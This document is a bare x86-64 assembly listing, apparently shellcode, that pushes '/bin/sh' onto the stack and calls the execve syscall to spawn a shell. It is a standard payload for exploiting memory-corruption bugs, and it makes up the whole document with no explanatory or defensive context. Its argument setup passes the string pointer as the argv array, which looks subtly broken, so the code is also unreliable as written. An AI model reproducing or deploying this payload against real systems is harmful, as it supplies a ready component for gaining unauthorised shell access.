BITS 64
    xor rdx, rdx
    mov rbx, `/bin/sh`
    push rbx
    mov rdi, rsp
    mov rsi, rdi
    mov rax, 59
    syscall
